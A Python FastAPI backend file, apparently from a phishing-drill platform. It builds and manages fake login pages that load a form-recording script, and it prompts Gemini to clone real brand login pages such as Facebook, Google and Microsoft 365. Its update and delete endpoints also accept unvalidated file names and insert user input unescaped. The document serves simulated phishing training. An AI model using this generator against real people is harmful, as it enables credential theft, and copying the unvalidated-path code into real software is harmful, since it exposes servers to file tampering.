'''
處理trigger網頁
'''
import json
import os
import shutil
import re
from pathlib import Path
from fastapi import (
    APIRouter, 
    Depends, 
    Form, 
    UploadFile, 
    File, 
    HTTPException, 
    status
)
from fastapi.responses import JSONResponse

from backend.services.log_manager import Logger


logger = Logger().get_logger()

# --- 路徑設定 ---

# 容器內的程式根目錄
BASE_DIR = Path("/app")

# JSON 設定檔的路徑
DATA_DIR = BASE_DIR / "backend" / "static"
JSON_FILE_PATH = DATA_DIR / "pageOptions.json"

# 檔案上傳的目的地 (對應到 loginapp/templates)
UPLOAD_DIR = BASE_DIR / "uploads_for_trigger_app_templates" 

# 應用啟動時，確保資料夾存在
DATA_DIR.mkdir(parents=True, exist_ok=True)
UPLOAD_DIR.mkdir(parents=True, exist_ok=True)

# --- 2. 驗證函式 (Dependency) ---

def validate_page_value(pageValue: str = Form(...)):
    """
    驗證 page_value，確保它適用於 URL 和檔案名稱。
    只允許小寫字母、數字和底線。
    """
    if not re.match(r"^[a-z0-9_]+$", pageValue):
        raise HTTPException(
            status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
            detail="網址 ID 只能包含小寫字母、數字和底線。"
        )
    return pageValue

def get_page_data():
    """輔助函式：讀取 JSON 資料"""
    if not JSON_FILE_PATH.exists():
        return []
    try:
        with JSON_FILE_PATH.open("r", encoding="utf-8") as f:
            data = json.load(f)
            if not isinstance(data, list):
                return []
            return data
    except json.JSONDecodeError:
        return []

def save_page_data(data: list):
    """輔助函式：寫回 JSON 資料"""
    try:
        with JSON_FILE_PATH.open("w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"寫入 JSON 失敗: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"寫入 JSON 檔案失敗: {str(e)}"
        )

# --- 3. API 端點 ---

def get_router():

    router = APIRouter()

    @router.get(
        "/get",
        summary="獲取所有頁面選項",
        tags=["trigger page"]
    )
    async def get_page_options():
        """
        讀取 pageOptions.json 並將其作為 API 回傳。
        """
        data = get_page_data()
        return JSONResponse(content=data)

    @router.get(
        "/config",
        summary="獲取前端配置 (如 Trigger App URL)",
        tags=["trigger page"]
    )
    async def get_config():
        """
        傳回前端需要的動態配置
        """
        return {
            "triggerUrl": os.getenv("TRIGGER_APP_URL", "")
        }

    @router.post(
        "/upload", 
        summary="上傳新頁面模板",
        tags=["trigger page"]
    )
    async def upload_new_page(
        # Form(...) 用於接收 multipart/form-data 的文字欄位
        pageLabel: str = Form(..., description="顯示在選項中的名稱 (e.g., '我的新頁面')"),
        pageValue: str = Depends(validate_page_value), # 使用 Depends 來驗證
        file: UploadFile = File(..., description="要上傳的 HTML 模板檔案")
    ):
        """
        此 API 執行兩個任務:
        1. 將上傳的檔案儲存到 loginapp 的 templates 資料夾。
        2. 將新頁面的資訊 (value, label) 新增到 pageOptions.json。
        """
        
        # --- 任務 1: 將上傳的頁面新增到資料夾裡 ---
        
        new_filename = f"{pageValue}.html"
        save_path = UPLOAD_DIR / new_filename

        # 檢查檔案是否已存在
        if save_path.exists():
            raise HTTPException(
                status_code=status.HTTP_409_CONFLICT,
                detail=f"檔案 '{new_filename}' 已存在於 templates 資料夾中。"
            )

        try:
            # 儲存上傳的檔案
            with save_path.open("wb") as buffer:
                shutil.copyfileobj(file.file, buffer)
        except Exception as e:
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail=f"儲存檔案失敗: {str(e)}"
            )
        finally:
            await file.close()

        # --- 任務 2: 將資料新增到 json 檔裡 ---
        
        data = []
        try:
            # 讀取現有的 JSON 檔案 (如果存在)
            if JSON_FILE_PATH.exists():
                with JSON_FILE_PATH.open("r", encoding="utf-8") as f:
                    data = json.load(f)
                    if not isinstance(data, list):
                        data = [] # 如果格式不對，重設為空列表
            
            # 再次檢查 value 是否在 JSON 中重複
            if any(item.get("value") == pageValue for item in data):
                # [復原] 如果 JSON 重複，刪除剛剛上傳的檔案
                save_path.unlink() 
                raise HTTPException(
                    status_code=status.HTTP_409_CONFLICT,
                    detail=f" 網址 ID '{pageValue}' 已存在於 pageOptions.json 中。"
                )

            # 新增資料
            new_entry = {"value": pageValue, "label": pageLabel}
            data.append(new_entry)

            # 寫回 JSON 檔案
            with JSON_FILE_PATH.open("w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)

        except Exception as e:
            # [復原] 如果 JSON 操作失敗，也要刪除剛剛上傳的檔案
            if save_path.exists():
                save_path.unlink()
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail=f"更新 JSON 檔案失敗: {str(e)}"
            )

        return {
            "status": "success",
            "message": f"頁面 '{pageLabel}' 已成功上傳。",
            "new_entry": new_entry
        }

    # (Update) 修改頁面模板
    @router.post(
        "/update",
        summary="修改現有頁面模板"
    )
    async def update_page(
        pageLabel: str = Form(..., description="新的Label"),
        pageValue: str = Depends(validate_page_value),
        oldPageValue: str = Form(..., description="要修改的目標 value"),
        file: UploadFile = File(None, description="上傳新的 HTML 檔案來覆蓋")
    ):
        
        data = get_page_data()
        
        # --- 任務 1: 覆蓋檔案 ---
        # 定義新舊檔案路徑
        old_filename = f"{oldPageValue}.html"
        old_file_path = UPLOAD_DIR / old_filename
        
        new_filename = f"{pageValue}.html"
        new_file_path = UPLOAD_DIR / new_filename
        
        is_value_changing = (pageValue != oldPageValue)

        # 檢查：如果要改 value，但新 value 已經在 JSON 中存在 (且不是自己)
        if is_value_changing:
            if any(item.get("value") == pageValue for item in data):
                raise HTTPException(
                    status_code=status.HTTP_409_CONFLICT,
                    detail=f"新的網址 ID '{pageValue}' 已經存在於另一個項目中。"
                )

        try:
            if file:
                # 覆蓋儲存
                with new_file_path.open("wb") as buffer:
                    shutil.copyfileobj(file.file, buffer)
                
                # 如果 value 也變了，且舊檔案存在，就把舊檔案刪除
                if is_value_changing and old_file_path.exists():
                    old_file_path.unlink()
            else:
                # 情況 2: 使用者沒有上傳新檔案
                # 只有在 value 改變時，才需要重命名
                if is_value_changing:
                    # 檢查：舊檔案是否存在
                    if not old_file_path.exists():
                        logger.warning(f"找不到舊檔案 {old_filename}，但仍會更新 JSON。")
                        # 檔案不存在，但我們還是可以繼續更新 JSON，所以不用 raise error
                    
                    # 檢查：新檔名是否已存在 (避免衝突)
                    elif new_file_path.exists():
                        raise HTTPException(
                            status_code=status.HTTP_409_CONFLICT,
                            detail=f"無法重命名：檔案 '{new_filename}' 已存在。"
                        )
                    
                    # 重命名
                    else:
                        old_file_path.rename(new_file_path)

        except Exception as e:
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail=f"處理檔案時失敗: {str(e)}"
            )
        finally:
            if file:
                await file.close()
            

        # --- 任務 2: 更新 JSON ---
        
        item_found = False
        for item in data:
            if item.get("value") == oldPageValue:
                item["label"] = pageLabel 
                item["value"] = pageValue
                item_found = True
                break
        
        if not item_found:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail=f"找不到 value 為 '{pageValue}' 的項目。"
            )
        
        save_page_data(data) # 寫回 JSON

        return {
            "status": "success",
            "message": f"頁面 '{pageLabel}' 已成功更新。"
        }    

    # (Delete) 刪除頁面模板
    @router.post(
        "/delete",
        summary="刪除現有頁面模板"
    )
    async def delete_page(
        pageValue: str = Form(..., description="要刪除的目標 value")
    ):
        
        # --- 任務 1: 刪除 JSON 條目 ---
        data = get_page_data()
        
        original_length = len(data)
        data = [item for item in data if item.get("value") != pageValue]
        
        if len(data) == original_length:
            logger.warning(f"試圖刪除不存在的 JSON 條目: {pageValue}")
            # 注意：即使 JSON 找不到，我們仍然嘗試刪除檔案

        save_page_data(data) # 寫回 JSON

        # --- 任務 2: 刪除檔案 ---
        filename = f"{pageValue}.html"
        save_path = UPLOAD_DIR / filename
        
        if save_path.exists():
            try:
                save_path.unlink()
            except Exception as e:
                raise HTTPException(
                    status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                    detail=f"刪除檔案 '{filename}' 失敗: {str(e)}"
                )
        else:
            logger.warning(f"試圖刪除不存在的檔案: {filename}")
            # 即使檔案不存在，也回傳成功 (因為目的已達到)

        return {
            "status": "success",
            "message": f"頁面 (value: {pageValue}) 已成功刪除。"
        }

    # (Create Custom) 建立自訂頁面
    @router.post(
        "/create_page",
        summary="建立自訂頁面",
        tags=["trigger page"]
    )
    async def create_custom_page(
        pageLabel: str = Form(..., description="顯示在選項中的名稱 (e.g., '我的新頁面')"),
        pageValue: str = Depends(validate_page_value),
        pageTitle: str = Form(..., description="網頁標題 (HTML Title)"),
        bgColor: str = Form(..., description="背景顏色 (e.g., '#f2f2f2' or 'white')"),
        bgImage: str = Form("", description="背景圖片 URL (可選)"),
        formTitle: str = Form(..., description="表單標題 (e.g., '登入')"),
        inputLabel: str = Form(..., description="輸入框標籤 (e.g., 'Email:')"),
        isEmail: bool = Form(..., description="輸入欄是否為電子郵件"),
        btnText: str = Form(..., description="按鈕文字 (e.g., '登入')"),
        templateType: str = Form("classic", description="版型選擇: 'classic' or 'modern'"),
        svgContent: str = Form("", description="SVG 圖示內容 (僅用於 Modern 版型)"),
    ):
        """
        根據使用者輸入的設定，自動生成 HTML 檔案並新增到選項中。
        """
        mail_type = "email" if isEmail else "text"

        # --- 1. 準備 HTML 內容 ---
        
        # 經典版型 (Test.html based)
        CLASSIC_PAGE_TEMPLATE = """<!DOCTYPE html>
<html lang="zh-Hant">
  <head>
    <meta charset="UTF-8" />
    <title>{title}</title>
    <style>
      body {{
        font-family: sans-serif;
        background-color: {bg_color};
        background-image: {bg_image_css};
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
      }}
      .login-box {{
        background: white;
        padding: 2rem;
        border-radius: 10px;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        width: 300px;
        opacity: 0.95; /* 稍微透明一點以免遮擋背景太死 */
      }}
      input[type="{mail_type}"] {{
        width: 100%;
        padding: 10px;
        margin-top: 10px;
        margin-bottom: 20px;
        border: 1px solid #ccc;
        border-radius: 5px;
        box-sizing: border-box; /* 確保 padding 不會撐開寬度 */
      }}
      button {{
        width: 100%;
        padding: 10px;
        background-color: #4caf50;
        color: white;
        border: none;
        border-radius: 5px;
        cursor: pointer;
      }}
      button:hover {{
        background-color: #45a049;
      }}
    </style>
  </head>
  <body>
    <div class="login-box">
      <h2>{form_title}</h2>
      <form id="login-form">
        <label for="email">{input_label}</label>
        <input type="{mail_type}" id="{mail_type}" required />
        <button type="submit">{btn_text}</button>
      </form>
    </div>

    <script>
      const API_BASE_PATH = "{{{{ api_base_path }}}}";
    </script>
    <script src="{{{{ url_for('static', path='js/recordingLogin.js') }}}}"></script>
  </body>

</html>
"""

        # 現代版型 (Modern_login.html based)
        MODERN_PAGE_TEMPLATE = """<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {{
            --primary-color: #4f46e5;
            --primary-hover: #4338ca;
            --bg-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            --bg-color: {bg_color};
            --card-bg: rgba(255, 255, 255, 0.95);
            --text-color: #1f2937;
            --text-secondary: #6b7280;
        }}

        body {{
            font-family: 'Inter', sans-serif;
            background: {bg_css};
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }}

        .login-card {{
            background: var(--card-bg);
            padding: 3rem;
            border-radius: 16px;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
            width: 100%;
            max-width: 400px;
            text-align: center;
            backdrop-filter: blur(10px);
            transition: transform 0.3s ease;
        }}

        .login-card:hover {{
            transform: translateY(-5px);
        }}

        .icon-container {{
            width: 64px;
            height: 64px;
            background: rgba(79, 70, 229, 0.1);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.5rem;
        }}

        .icon-container svg {{
            width: 32px;
            height: 32px;
            color: var(--primary-color);
        }}

        h2 {{
            color: var(--text-color);
            font-size: 1.875rem;
            font-weight: 700;
            margin: 0 0 0.5rem;
        }}

        p.subtitle {{
            color: var(--text-secondary);
            margin-bottom: 2rem;
            font-size: 0.875rem;
        }}

        .form-group {{
            margin-bottom: 1.5rem;
            text-align: left;
        }}

        label {{
            display: block;
            color: var(--text-color);
            font-size: 0.875rem;
            font-weight: 500;
            margin-bottom: 0.5rem;
        }}

        input[type="{mail_type}"] {{
            width: 100%;
            padding: 0.75rem 1rem;
            border: 1px solid #d1d5db;
            border-radius: 0.5rem;
            font-size: 1rem;
            box-sizing: border-box; /* Crucial for padding */
            transition: border-color 0.2s, box-shadow 0.2s;
            outline: none;
        }}

        input[type="{mail_type}"]:focus {{
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
        }}

        button {{
            width: 100%;
            padding: 0.875rem;
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: 0.5rem;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s, transform 0.1s;
        }}

        button:hover {{
            background-color: var(--primary-hover);
        }}

        button:active {{
            transform: scale(0.98);
        }}

        .footer {{
            margin-top: 1.5rem;
            font-size: 0.75rem;
            color: var(--text-secondary);
        }}
    </style>
</head>
<body>
    <div class="login-card">
        <div class="icon-container">
            {svg_icon}
        </div>
        
        <h2>{form_title}</h2>
        <!-- <p class="subtitle">請輸入您的電子郵件以繼續</p> -->

        <form id="login-form">
            <div class="form-group">
                <label for="email">{input_label}</label>
                <input type="{mail_type}" id="{mail_type}" required />
            </div>
            <button type="submit">{btn_text}</button>
        </form>

        <div class="footer">
            © 2024 Secure Portal. All rights reserved.
        </div>
    </div>

    <!-- Required Tracking Scripts -->
    <script>
      const API_BASE_PATH = "{{{{ api_base_path }}}}";
    </script>
    <script src="{{{{ url_for('static', path='js/recordingLogin.js') }}}}"></script>
</body>
</html>
"""
        
        bg_image_css = f"url('{bgImage}')" if bgImage else "none"
        
        DEFAULT_SVG = """<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>"""

        if templateType == 'modern':
            # Modern Template Logic
            # 如果背景圖片存在，使用背景圖片，否則使用背景顏色 (但 modern template 的 CSS 變數需要調整)
            # 為了簡化，如果 bgImage 存在，bg_css = url(...), 否則 bg_css = var(--bg-color)
            if bgImage:
                bg_css = f"url('{bgImage}')"
            else:
                 # 使用漸層或純色? 這裡保留原來的漸層或是使用者指定的 pure color
                 # 如果使用者指定了 bgColor (e.g. #f2f2f2), 我們可以用它覆蓋漸層
                 bg_css = bgColor if bgColor else "linear-gradient(135deg, #667eea 0%, #764ba2 100%)"
            
            # SVG 處理
            final_svg = svgContent if svgContent and svgContent.strip() else DEFAULT_SVG

            html_content = MODERN_PAGE_TEMPLATE.format(
                title=pageTitle,
                bg_color=bgColor, # 其實這個變數只在 fallback 用
                bg_css=bg_css,
                svg_icon=final_svg,
                form_title=formTitle,
                input_label=inputLabel,
                btn_text=btnText,
                mail_type=mail_type
            )
        else:
            # Classic Template Logic
            html_content = CLASSIC_PAGE_TEMPLATE.format(
                title=pageTitle,
                bg_color=bgColor,
                bg_image_css=bg_image_css,
                form_title=formTitle,
                input_label=inputLabel,
                btn_text=btnText,
                mail_type=mail_type
            )

        
        # --- 2. 儲存檔案 ---
        
        filename = f"{pageValue}.html"
        save_path = UPLOAD_DIR / filename
        
        if save_path.exists():
            raise HTTPException(
                status_code=status.HTTP_409_CONFLICT,
                detail=f"檔案 '{filename}' 已存在於 templates 資料夾中。"
            )
            
        try:
             with save_path.open("w", encoding="utf-8") as f:
                f.write(html_content)
        except Exception as e:
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail=f"建立檔案失敗: {str(e)}"
            )

        # --- 3. 更新 JSON ---
        
        data = []
        try:
            if JSON_FILE_PATH.exists():
                with JSON_FILE_PATH.open("r", encoding="utf-8") as f:
                    data = json.load(f)
                    if not isinstance(data, list):
                        data = []
            
            if any(item.get("value") == pageValue for item in data):
                save_path.unlink() # Rollback
                raise HTTPException(
                    status_code=status.HTTP_409_CONFLICT,
                    detail=f"網址 ID '{pageValue}' 已存在於 pageOptions.json 中。"
                )

            new_entry = {"value": pageValue, "label": pageLabel}
            data.append(new_entry)

            save_page_data(data)

        except Exception as e:
            if save_path.exists():
                save_path.unlink() # Rollback
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail=f"更新 JSON 檔案失敗: {str(e)}"
            )

        return {
            "status": "success",
            "message": f"自訂頁面 '{pageLabel}' 已成功建立。",
            "new_entry": new_entry
        }

    @router.post(
        "/generate_with_ai",
        summary="使用 AI 生成頁面",
        tags=["trigger page"]
    )
    async def generate_page_with_ai(
        prompt: str = Form(..., description="使用者的提示詞"),
        refUrl: str = Form(None, description="參考網址 (可選)"),
        apiKey: str = Form(None, description="Google Gemini API Key (可選)")
    ):
        """
        接收 Prompt，呼叫 Gemini API 生成 HTML。
        """
        import google.generativeai as genai
        from fastapi.responses import PlainTextResponse

        # 1. 決定 API Key
        # 優先使用傳入的，否則使用環境變數
        api_key_to_use = apiKey
        if not api_key_to_use:
            api_key_to_use = os.getenv("GOOGLE_API_KEY")
        
        if not api_key_to_use:
             raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="未提供 Gemini API Key，且後端環境變數也未設定 GOOGLE_API_KEY。"
            )

        # 2. 設定 Gemini
        try:
            genai.configure(api_key=api_key_to_use)
            model = genai.GenerativeModel("gemini-2.5-flash") # 使用較快且新的模型
        except Exception as e:
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail=f"Gemini 設定失敗: {str(e)}"
            )

        # 3. 準備 System Prompt / 指令
        # 這裡我們定義嚴格的規則
        system_instructions = """
你是一個專業的前端工程師，專門製作社交演練用的登入頁面。
使用者會給你一個描述 (e.g. "Facebook 登入頁面")，你需要生成一個單一的 HTML 檔案。

[重點功能 - 仿真設計]
1. 如果使用者指定了特定的知名服務 (例如：Facebook, Google, 台鐵, Instagram, Microsoft 365 等)：
   - 你必須運用你內部的知識，精確還原該品牌 **真實登入頁面** 的視覺風格。
   - 使用該品牌的官方配色 (Brand Colors)。
   - 模仿其佈局結構 (例如：左右分割、置中卡片、背景圖風格)。
   - 盡可能還原按鈕樣式、輸入框樣式和字體風格。
   - 如果需要 Logo，請使用 SVG 繪製或使用可靠的 CDN 連結，使其看起來像真的。

[必要的技術限制 - 絕對必須遵守]
1. 這是一個釣魚演練系統的模板。
2. **必須**包含以下 Script 區塊，且必須放在 `</body>` 之前：
   ```html
   <script>
     const API_BASE_PATH = "{{ api_base_path }}";
   </script>
   <script src="{{ url_for('static', path='js/recordingLogin.js') }}"></script>
   ```
   **注意**：`API_BASE_PATH` 的值必須保留為 Jinja2 的模板語法 `{{ api_base_path }}`，`src` 也必須保留 `{{ url_for(...) }}`。不要更改它們。

3. **登入表單的輸入欄位**：
   - **必須**使用 `<form id="login-form">` 包裝所有的輸入欄位和提交按鈕。
   - 所有的 `<input>` 標籤，如果是用來讓使用者輸入資料的 (如 Email, 帳號, 密碼)，**必須**加上屬性 `data-role="login-input"`。
   - 例如：`<input type="email" name="email" data-role="login-input" required>`
   - `input` 的 `id` 屬性也請設定。

4. **樣式 (CSS)**：
   - 請將 CSS 直接寫在 `<style>` 標籤內 (Internal CSS)。
   - 版面要符合使用者的描述。

5. **輸出格式**：
   - 只回傳純 HTML 程式碼。
   - 不要包含 Markdown 的 ```html ... ``` 標記，只要 HTML 本身。
   - 不要包含解釋性文字。
"""

        prompt_suffix = f"使用者的需求：{prompt}"
        if refUrl:
            prompt_suffix += f"\n\n[參考網址]\n使用者提供了一個參考網址：{refUrl}\n這是使用者想模仿的目標。請盡可能參考該網址對應的現有網站設計風格（如果該網站在你的知識庫中）。"

        full_prompt = f"{system_instructions}\n\n{prompt_suffix}"

        # 4. 呼叫模型
        try:
            response = model.generate_content(full_prompt)
            generated_text = response.text
            
            # 清理可能的 markdown 標記 (如果模型還是輸出的話)
            generated_text = generated_text.replace("```html", "").replace("```", "").strip()

            return PlainTextResponse(generated_text)

        except Exception as e:
            logger.error(f"Gemini 生成失敗: {e}")
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail=f"AI 生成失敗: {str(e)}"
            )

    return router
